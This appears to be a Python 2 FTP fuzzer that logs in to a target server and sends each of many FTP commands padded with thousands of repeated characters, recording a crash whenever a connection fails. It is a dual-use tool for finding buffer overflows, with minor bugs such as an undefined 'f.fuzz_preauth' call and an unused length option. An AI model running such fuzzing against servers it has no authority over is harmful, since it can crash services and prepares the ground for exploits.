#
# Import the required modulees the script will leverage
# This lets us use the functions in the modules instead of writing the code from scratch
import sys, socket, argparse
from time import sleep

cmdList = [ "!", "dir", "mdelete", "qc", "site","$","disconnect","mdir","sendport", 
           "size","account","exit", "mget","put","status","append","form","mkdir", 
           "pwd","struct","ascii","get","mls", "quit","system","bell","glob","mode", 
           "quote","sunique", "binary","hash","modtime","recv", "tenex", "bye", 
           "help", "mput", "reget", "tick","case", "idle","newer","rstatus","trace", 
           "cd", "image", "nmap", "rhelp", "type", "cdup", "ipany", "nlist", "rename", 
           "user","chmod", "ipv4", "ntrans", "reset", "umask", "close", "ipv6", "open", 
           "restart", "verbose", "cr", "lcd", "prompt", "rmdir", "?", "delete", "ls", 
           "passive", "runique", "debug", "macdef", "proxy", "send"]

def fuzz_preauth(target, buffer_len):
  print "not yet implemented"

def fuzz_postauth(target, user, passw, buffer_len):

  firstTime = True

  for cmd in cmdList:
     for c in range(41,42):

        my_char = chr(c)
        print "cmd:" + cmd +" | char( " + str(c) + "): " + my_char 
        
        buff = my_char * 5000

        for x in range(0,5):

          try:

            # OPEN SOCKET ==================================== 
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target,21))
            data = s.recv(1024)
            print '%s\r\n'%data

            # LOGIN ==========================================
            s.send("USER " + user + "\r\n")  
            data = s.recv(1024)
            print '%s\n'%data

            s.send("PASS " + passw + "\r\n")          
            data = s.recv(1024)
            print '%s\n'%data

            if firstTime is True:
              sleep(3)
              firstTime = False

            # SEND PAYLOAD ===================================
            payload = cmd + " " + buff + "\r\n"
            print "char: chr(" + str(c) + ")\n"
            print "Send (" + str(len(payload)) + "): " + payload

            s.send(payload)
    
            #sleep(1)
   
            # Quit connection
            s.send('QUIT\r\n')
            s.close()

            # Increase the buff string by 50 A's and then the loop continues
            buff = buff + (my_char*5000)

          except: # If we fail to connect to the server, we assume its crashed and print the statement below
            errMsg = "[+] Crash occured with cmd: " + cmd + ";char: chr(" + str(c) + ") = " + my_char + "; length: "+ str(len(buff)-50) + "\r\n"
            print errMsg
            file = open("crashes.txt","a") 
            file.write(errMsg)
            file.close() 
            #sys.exit()


def main():

  parser = argparse.ArgumentParser(
      description = '\r\nExample: ftpfuzzer.py -o -t 10.0.0.74 -u admin -p test')

  parser.add_argument('-o','--post', help = 'post authentication',action='store_true')
  parser.add_argument('-r','--pre', help = 'pre-authentication',action='store_true')
  parser.add_argument('-u','--user', help = 'UserName')
  parser.add_argument('-p','--password', help = 'password')
  parser.add_argument('-t','--target', help = 'Target host')
  parser.add_argument('-l','--length', help = 'Lenght of buffer')

  args = parser.parse_args()

  if args.target == None: 
    print "Please Enter Target\r\n"
    parser.print_help()
    sys.exit()
  elif args.post == True and args.password == None:
    print "Please Enter Password\r\n"
    parser.print_help()
    sys.exit()

  buffer_len =  5000 # default

  if args.length:                                                                                                                             
      buffer_len = int(args.length)

  if args.pre == True:
    f.fuzz_preauth(args.target, buffer_len)
  elif args.password and args.post == True:
    fuzz_postauth(args.target, args.user, args.password, buffer_len)
  elif args.user == None:
    print "Please Enter UserName\r\n"
    parser.print_help() 

  
if __name__ == '__main__':
    main()